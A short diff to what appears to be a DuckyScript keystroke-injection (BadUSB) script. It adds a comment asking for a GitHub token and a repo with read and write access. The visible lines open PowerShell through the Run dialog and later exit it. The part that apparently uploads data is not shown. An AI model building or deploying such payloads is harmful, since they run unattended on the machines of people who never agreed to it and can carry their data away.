@@ -1,3 +1,6 @@
+REM change GITHUB TOKEN HERE, and YOUR GITHUB REPO HERE, when you make a token for github make sure you have it pointing at the correct repo you want it saved in. can be a private repo too also needs read and write perms
+
+
 REM --- Open PowerShell ---
 GUI r
 DELAY 500
@@ -22,4 +25,5 @@ DELAY 500
 ENTER
 DELAY 200
 STRING exit
+
 ENTER
